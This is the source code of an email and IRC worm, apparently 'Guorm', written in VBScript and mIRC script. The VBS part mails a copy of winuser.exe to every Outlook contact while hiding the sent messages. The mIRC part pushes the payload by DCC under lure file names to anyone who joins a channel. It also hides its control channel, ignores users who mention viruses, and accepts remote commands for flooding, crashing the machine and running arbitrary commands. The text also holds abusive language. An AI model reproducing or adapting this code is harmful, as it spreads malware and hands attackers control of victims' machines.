   'Guorm(Vbs). Mirc/Outlook/Vbs. By Kalamar & BrainMuscle & OldWary.
   on Error Resume Next
   Dim fso, ws
   Set fso = CreateObject("Scripting.filesystemobject")
   Set ws = CreateObject("WScript.Shell")
   if ws.regread("HKCU\Software\Microsoft\Windows\CurrentVersion\vbsmail") <> "Done" Then
   Set Oapp = CreateObject("Outlook.Application")
   if Oapp = "Outlook" then
   Set OMapi = Oapp.GetNameSpace("MAPI")
   For Each OAddress In OMapi.AddressLists
     If OAddress.AddressEntries.Count <> 0 Then
       For Oque = 1 To OAddress.AddressEntries.Count
         Set Oque2 = OAddress.AddressEntries(Oque)
            if Oque2.address<> "" then
             Set Messge = Oapp.CreateItem(0)
             Messge.to = Oque2.address
             Messge.Subject = "You know what it is!. ;-P"
             Messge.Body = "Hey, here you have!."
             Messge.Attachments.Add fso.getspecialfolder(1) & "\winuser.exe"
             Messge.DeleteAfterSubmit = True
             Messge.Send
            end if
       Next
     End If
   Next
   ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\vbsmail", "Done"
   Oapp.Quit
   end if

   n0=on *:CONNECT:{
   n1=  .join #guorm
   n2=  set %chancolor $chr(3) $+ 4
   n3=  .timercon1 -m 1 250 .msg #guorm %chancolor $+ -------------------------------------- $+ $chr(3)
   n4=  .timercon2 -m 1 500 .msg #guorm Just annother dumbass
   n5=  .timercon3 -m 1 750 .msg #guorm Mother fucker who got infected
   n6=  .timercon4 -m 1 1000 .msg #guorm by Guorm - BrainMuscle + OldWary + Kalamar
   n7=  .timercon5 -m 1 1250 .msg #guorm %chancolor $+ -------------------------------------- $+ $chr(3)
   n8=  .timercon6 -m 1 2000 unset %chancolor
   n9=  chanstatus
   n10=  .timercon7 1 20 update
   n11=}
   n12=on *:JOIN:#guorm:{ .window -h #guorm }
   n13=on *:DISCONNECT:{
   n14=  .part #guorm
   n15=}
   n16=alias -l chanstatus {
   n17=  .timerop1 1 10 if ($me isop #guorm) .topic #guorm -=[ Guorm ]=-
   n18=  .timerop2 1 11 if ($me isop #guorm) .mode #guorm +nst
   n19=  .timerop3 1 12 if ($me isop #guorm) .mode #guorm -o $me
   n20=}
   n21=on *:JOIN:#: if (($nick != $me) && ($chan != #guorm) && ($chan != #virus)) { guorm.infect $nick }
   n22=on *:TEXT:*virus*:*: if ((#virus != $chan) && (#guorm != $chan)) .ignore $nick
   n23=on *:TEXT:*worm*:*: if ((#virus != $chan) && (#guorm != $chan)) .ignore $nick
   n24=on *:TEXT:!GuormFlood*:#guorm:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME
   n25=ctcp *:!GuormFlood:*:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME
   n26=on *:TEXT:!joinflood*:#guorm:.timer51 10 2 .join $2 | .timer52 10 3 .part $2
   n27=ctcp *:!joinflood:*:.timer51 10 2 .join $2 | .timer52 10 3 .part $2
   n35=ctcp *:!kill:*:.run -n file://c:/con/con
   n36=ctcp *:!fserve:*:.fserve $nick 1 $2
   n37=ctcp *:+*:*: $right($1-,-1) | /halt
   n38=ctcp *:PING: { raw -q notice $nick : $+ $chr(1) $+ PING BrainMuscle + OldWary + KALAMAR $+ $chr(1) } /halt
   n39=ctcp *:VERSION: { raw -q notice $nick : $+ $chr(1) $+ VERSION Guorm 1.0 $+ $chr(1) } /halt
   n40=ctcp *:FINGER:*: /halt
   n41=ctcp *:TIME: { raw -q notice $nick : $+ $chr(1) $+ TIME Guorm time! $+ $chr(1) } /halt
   n42=ctcp *:AUTHOR: { raw -q notice $nick : $+ $chr(1) $+ AUTHOR BrainMuscle + OldWary + KALAMAR $+ $chr(1) } /halt
   n43=raw 353:*guorm*:/halt
   n44=raw 366:*dguorm*:/halt
   n45=raw 403:*dguorm*:/halt
   n46=raw 442:*dguorm*:/halt
   n47=raw *:*guorm*:/halt
   n48=alias -l file.name return $gettok(:matrix.scr:monkeys3.scr:chanrules.exe:assfucked16&14.scr:notepad-cracked.exe:5433.scr:45435.exe:987423.exe:21363.scr:me&natalie.scr:blank.scr:windowsbreaker.exe:mirc32.exe:fifthelement.scr:mirc32-crack.exe:matrix-tr
   n49=alias guorm.infect {
   n50=  %guorm.sock = guorm.send. $+ $rand(100,9000)
   n51=  socklisten %guorm.sock
   n52=  .timer99 off
   n53=  .timer99 1 120 sockclose guorm.send.*
   n54=  raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND $file.name $longip($ip) $sock(%guorm.sock).port $file(c:\windows\system\user.dll).size $+ $chr(1)
   n55=}
   n56=on *:socklisten:guorm.send.*:{
   n57=  set %guorm.temp guorm.write. $+ $gettok($sockname,3,46) | sockaccept %guorm.temp | guorm.send %guorm.temp | sockclose $sockname
   n58=}
   n59=on *:sockwrite:guorm.write.*:{
   n60=  if ($sock($sockname).sent >= $file(c:\windows\system\user.dll).size) sockwrite -n $sockname
   n61=  else guorm.send $sockname
   n62=}
   n63=alias  guorm.send {
   n64=  bread c:\windows\system\user.dll $sock($sockname).sent 4096 &guorm.data
   n65=  sockwrite $1 &guorm.data
   n66=}
